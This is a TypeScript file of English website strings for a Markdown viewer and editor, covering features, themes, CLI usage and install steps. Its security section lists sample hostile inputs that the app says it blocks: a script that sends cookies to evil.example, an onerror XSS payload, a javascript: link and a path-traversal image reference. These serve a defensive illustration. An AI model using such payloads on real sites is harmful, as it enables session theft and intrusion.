import type { Messages } from './ja';

/** サイトの文言（英語）。語はアプリの英語 UI（`src/i18n/en/`）と README.en.md に合わせる。 */
export const en: Messages = {
  meta: {
    siteName: 'Marxdown',
    title: 'Marxdown — The app for reading and writing Markdown',
    description:
      'A light and beautiful Markdown viewer & editor that shows your file the moment you type marxdown README.md in a terminal. Free and open source, for Windows 10 / 11.',
    guideSuffix: 'Marxdown Guide',
    imageAlt: 'Screenshot of Marxdown showing a Markdown document rendered cleanly',
  },

  nav: {
    skip: 'Skip to content',
    features: 'Features',
    guide: 'Guide',
    download: 'Download',
    github: 'GitHub',
    menu: 'Menu',
    search: 'Search the guide',
    appearance: 'Appearance',
    appearanceOptions: { system: 'System', light: 'Light', dark: 'Dark' },
    language: 'Language',
  },

  hero: {
    badge: (version: string) => `v${version} is out`,
    badgeLink: 'Changelog',
    titleLines: ['The app for reading', 'and writing *Markdown.*'],
    lead: 'A light and beautiful Markdown viewer & editor that shows your file the moment you type {command} in a terminal.',
    leadCommand: 'marxdown README.md',
    download: 'Download for Windows',
    downloadMeta: (version: string) => `v${version} · Windows 10 / 11 (x64) · Free`,
    guide: 'Read the guide',
    replay: 'Replay',
    terminalTitle: 'Windows PowerShell',
    prompt: 'PS C:\\work\\search-api>',
    commands: ['marxdown README.md', 'marxdown CHANGELOG.md'],
  },

  statement: {
    eyebrow: 'When to use it',
    lines: [
      '*Design docs* written by an LLM. A repository’s *README*. *Meeting notes*.',
      'You want to “just open and check” a Markdown file dozens of times a day.',
      'You shouldn’t have to wait for an IDE every time.',
    ],
    closing: 'Marxdown is an app for opening, reading, and making small edits.',
  },

  speed: {
    eyebrow: 'Opens instantly',
    title: 'No waiting, every time you open.',
    body: 'After it starts, Marxdown waits in the system tray, and later marxdown calls open as tabs in the existing window. The prompt in your terminal comes back right away, too.',
    stats: [
      { value: '600', unit: 'ms', label: 'Target for the first launch' },
      { value: '120', unit: 'ms', label: 'Target after that' },
      { value: '≈0', unit: '%', label: 'CPU usage while waiting' },
    ],
    tray: 'Waiting in the system tray',
    tabNote: 'Opens as a tab in the existing window',
  },

  tour: {
    eyebrow: 'Read · Write · Find',
    title: 'Open it. Read it. Make a small fix.',
    steps: [
      {
        id: 'read',
        label: 'Read',
        title: 'A preview made for reading',
        body: 'Typography with balanced margins, line height, and text width keeps long documents easy to read. Tables, code, math, and diagrams are shown as they are.',
        chips: [
          'Tables',
          'Syntax highlighting',
          'Math (KaTeX)',
          'Diagrams (Mermaid)',
          'GitHub alerts',
          'Task lists',
          'Footnotes',
        ],
      },
      {
        id: 'write',
        label: 'Write',
        title: 'Edit right there, with a single key',
        body: 'Switch between Preview, Edit, and Split with a single key. The editor is Monaco, the same editor as VS Code. What you type shows up in the preview next to it right away.',
        chips: [],
      },
      {
        id: 'format',
        label: 'Format',
        title: 'Formatting and tables, from the keyboard',
        body: 'Toggle bold, links, headings, and lists with shortcuts. A messy table lines up its columns with Shift+Alt+F.',
        chips: [],
      },
      {
        id: 'find',
        label: 'Find',
        title: 'Open whole folders',
        body: 'marxdown docs/ opens the folder with a file list. Find files by part of their name with Ctrl+P, and run every action from the Command Palette with Ctrl+Shift+P.',
        chips: [],
      },
    ],
    keys: {
      split: 'Split',
      bold: 'Bold',
      align: 'Align table columns',
      quickOpen: 'Go to File',
      commandPalette: 'Command Palette',
    },
    quickOpenPlaceholder: 'Type a file name',
    quickOpenQuery: 'cache',
  },

  themes: {
    eyebrow: 'Make it yours',
    title: 'Find the one among 50 color themes.',
    body: 'On top of light and dark, there are 50 built-in color themes, chosen separately for the preview and the editor. Add your own by just dropping in a CSS file.',
    scheme: 'Appearance',
    schemeLight: 'Light',
    schemeDark: 'Dark',
    current: 'Current color theme',
    custom: 'Just drop a CSS file into the themes folder',
    defaultName: 'Marxdown',
  },

  typography: {
    eyebrow: 'Readability',
    title: 'Font size, line height, and text width. All yours.',
    body: 'Adjust the text and code fonts, font size, line height, text width, and table borders in Settings. Changes show up in the preview right away.',
    fontSize: 'Font size',
    lineHeight: 'Line height',
    maxWidth: 'Text width',
    tableStyle: 'Table borders',
    tableStyles: { lines: 'Horizontal lines', grid: 'Grid', zebra: 'Stripes' },
    font: 'Font',
    fonts: { sans: 'Sans-serif', serif: 'Serif' },
    reset: 'Reset',
  },

  bytes: {
    eyebrow: 'Save with confidence',
    title: 'Not a single byte you didn’t edit will change.',
    body: 'Lines you didn’t touch stay exactly as they were. Line endings, the BOM, and the final newline are kept as they were when opened. When another app changes the file, it reloads automatically.',
    chips: ['Still UTF-8 with BOM', 'Still CRLF', 'Final newline kept'],
    changed: 'Bytes changed',
    total: 'Whole file',
    unit: 'bytes',
    before: 'Before saving',
    after: 'After saving',
    edit: { from: '5', to: '3' },
  },

  security: {
    eyebrow: 'Files you didn’t write',
    title: 'Open Markdown you didn’t write, without worry.',
    body: 'Marxdown is built on the assumption that you open Markdown you didn’t write, like files generated by an LLM. Several layers of defense keep a document from reaching into the app or your computer.',
    file: 'untrusted.md',
    threats: [
      {
        code: '<script>fetch("https://evil.example/?" + document.cookie)</script>',
        verdict: 'Embedded scripts never run',
      },
      { code: '<img src="x" onerror="alert(1)">', verdict: 'Event attributes like onerror are removed' },
      { code: '[Read more](javascript:alert(1))', verdict: 'Links of unknown kinds do nothing' },
      { code: '![](../../Pictures/private.png)', verdict: 'Nothing outside the folder is loaded unless you allow it' },
    ],
    layers: ['CSP', 'Sanitizer', 'Link allowlist', 'Read scope check'],
    blocked: 'Blocked',
    safe: 'Shown safely',
  },

  features: {
    eyebrow: 'And more',
    title: 'Everything you need for Markdown.',
    items: [
      {
        icon: 'outline',
        title: 'Outline',
        body: 'Jump to the part you want from the list of headings.',
        keys: 'Ctrl+Shift+U',
      },
      { icon: 'search', title: 'Find in preview', body: 'Search the document you are viewing.', keys: 'Ctrl+F' },
      { icon: 'slides', title: 'Marp slides', body: 'Documents with marp: true are shown as slides.', keys: '' },
      {
        icon: 'export',
        title: 'Export to HTML / PDF',
        body: 'Turn the document you are viewing into HTML or PDF.',
        keys: '',
      },
      {
        icon: 'reload',
        title: 'Automatic reload',
        body: 'When another app changes the file, it reloads automatically.',
        keys: '',
      },
      {
        icon: 'files',
        title: 'File operations',
        body: 'Create, rename, copy, and move files to the Recycle Bin from the file list.',
        keys: '',
      },
      {
        icon: 'pipe',
        title: 'Open from stdin',
        body: 'Open the output of a command as an untitled document.',
        keys: '',
      },
      {
        icon: 'language',
        title: 'English and Japanese',
        body: 'The app is available in English and Japanese. By default it follows the display language of Windows.',
        keys: '',
      },
      {
        icon: 'update',
        title: 'Automatic updates',
        body: 'When a new version is out, the app lets you know and updates with a single button.',
        keys: '',
      },
      {
        icon: 'folder',
        title: 'From File Explorer',
        body: 'Double-click a .md file, or open a folder from its right-click menu.',
        keys: '',
      },
    ],
  },

  cli: {
    eyebrow: 'From the terminal',
    title: 'Your terminal is the front door.',
    body: 'Whether you run it from cmd.exe, PowerShell, or Git Bash, the prompt comes back right away.',
    examples: [
      { command: 'marxdown README.md', description: 'Open a file' },
      { command: 'marxdown README.md CHANGELOG.md', description: 'Open several files at once' },
      { command: 'marxdown docs/', description: 'Open a folder' },
      { command: 'marxdown -m split notes.md', description: 'Open in a specific view mode' },
      { command: 'llm "Draft a design" | marxdown -', description: 'Open standard input as an untitled document' },
    ],
    copy: 'Copy',
    copied: 'Copied',
  },

  install: {
    eyebrow: 'Get started',
    title: 'Installation takes three steps.',
    steps: [
      { title: 'Download', body: 'Download Marxdown_<version>_x64-setup.exe from Releases.' },
      { title: 'Run it', body: 'No administrator rights needed. It installs to %LOCALAPPDATA%\\Marxdown.' },
      {
        title: 'Enable the command',
        body: 'Choose “Yes” at the last prompt, and you can open files with marxdown from your terminal.',
      },
    ],
    smartScreen:
      'The installer is not code-signed, so SmartScreen shows a warning the first time you run it. Choose “More info” and then “Run anyway” to continue.',
    requirements: 'Requirements: Windows 10 / 11 (x64). The WebView2 Runtime is required (it comes with Windows 11).',
    more: 'Detailed installation steps',
  },

  cta: {
    title: 'Make Markdown feel better.',
    body: 'Free and open source. Try it right now.',
    download: 'Download for Windows',
    github: 'View on GitHub',
  },

  footer: {
    tagline: 'The app for reading and writing Markdown.',
    product: 'Product',
    guide: 'Guide',
    community: 'Community',
    features: 'Features',
    download: 'Download',
    changelog: 'Changelog',
    issues: 'Report a bug',
    ideas: 'Suggest a feature',
    security: 'Security',
    source: 'Source code',
    license: 'MIT License',
  },

  guide: {
    title: 'Guide',
    pages: {
      start: 'Getting started',
      shortcuts: 'Keyboard shortcuts',
      syntax: 'Syntax',
      settings: 'Settings',
    },
    descriptions: {
      start: 'Installation, using Marxdown from the command line, where files are kept, and more to get you started.',
      shortcuts: 'The list of Marxdown keyboard shortcuts.',
      syntax: 'The Markdown syntax Marxdown can show. The source is on the left and the result on the right.',
      settings: 'Every setting, in the same order as the Settings screen (Ctrl+,).',
    },
    onThisPage: 'On this page',
    edit: 'Source of this page',
    prev: 'Previous',
    next: 'Next',
    filter: 'Filter',
    shortcutFilterPlaceholder: 'Filter by action or key (e.g. Save, Ctrl+P)',
    settingFilterPlaceholder: 'Filter by name or key (e.g. line height, editor.fontSize)',
    noMatch: 'Nothing matches',
    source: 'Source',
    result: 'Result',
    settingKey: 'Key',
    settingDefault: 'Default',
    settingRange: 'Range',
    settingOptions: 'Options',
    settingEmpty: '(empty)',
    copyKey: 'Copy key',
    requiresSetting: 'Available after turning it on in Settings',
    settingsIntro:
      'Listed in the same order as the Settings screen (Ctrl+,). When editing settings.json directly, use the key of each setting (e.g. preview.fontSize). Open settings.json from “Open settings.json” in Settings.',
    customThemes: {
      title: 'Adding your own color theme',
      body: [
        'Each .css file in the themes folder becomes a color theme and appears in Color Theme in Settings. It can be selected for both the preview and the editor. The theme name is the file name without the extension (only letters, digits, - and _).',
        'Write only declarations in the file, without selectors. Use light-dark() for different colors in light and dark, and color-scheme for a theme that supports only one of them. A file with the same name as a built-in theme is used instead of it. Changes take effect as soon as you save the file.',
      ],
      location: 'Location',
      variables: 'Variables',
      groups: {
        surface: 'Background',
        text: 'Text',
        border: 'Borders',
        accent: 'Accent',
        code: 'Code',
      },
    },
    marpNote: 'Slide preview',
  },

  palette: {
    placeholder: 'Search the guide',
    empty: 'No results',
    hint: '↑↓ to select · Enter to go · Esc to close',
    kinds: { page: 'Page', shortcut: 'Shortcut', setting: 'Setting', syntax: 'Syntax', section: 'Section' },
    open: 'Search the guide',
  },

  window: {
    mode: { preview: 'Preview', edit: 'Edit', split: 'Split' },
    encoding: 'UTF-8',
    eol: 'LF',
    chars: (count: number) => `${count.toLocaleString('en-US')} chars`,
    minutes: (count: number) => `~${count} min`,
    sync: 'Scroll sync: On',
    untitled: 'Untitled',
    explorer: 'Explorer',
    outline: 'Outline',
  },
};
